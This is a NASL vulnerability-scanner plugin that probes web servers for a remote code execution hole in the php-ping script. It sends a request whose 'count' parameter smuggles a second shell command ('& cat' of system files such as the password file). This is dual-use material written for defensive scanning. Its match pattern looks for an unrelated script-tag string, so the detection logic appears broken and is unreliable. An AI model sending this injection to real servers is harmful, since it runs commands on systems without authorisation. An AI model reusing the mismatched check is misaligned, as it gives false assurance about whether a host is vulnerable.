if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.11966" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)" );
	script_bugtraq_id( 9309 );
	script_tag( name: "cvss_base", value: "9.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:C/I:C/A:C" );
	script_name( "Remote Code Execution in PHP Ping" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2003 Noam Rathaus" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "os_detection.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "summary", value: "php-ping is a simple php script executing the 'ping' command.

  A bug in this script allows users to execute arbitrary commands. The problem is based upon the
  fact that not all user inputs are filtered correctly: although $host is filtered using
  preg_replace(), the $count variable is passed unfiltered to the system() command." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one." );
	exit( 0 );
}
require("host_details.inc.sc");
require("os_func.inc.sc");
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
files = traversal_files( "linux" );
for dir in nasl_make_list_unique( "/", http_cgi_dirs( port: port ) ) {
	for file in keys( files ) {
		if(dir == "/"){
			dir = "";
		}
		url = dir + "/php-ping.php?count=1+%26+cat%20/" + files[file] + "+%26&submit=Ping%21";
		if(http_vuln_check( port: port, url: url, check_header: TRUE, pattern: "value=\"\"><script>foo</script>\"" )){
			report = http_report_vuln_url( port: port, url: url );
			security_message( port: port, data: report );
			exit( 0 );
		}
	}
}
exit( 99 );

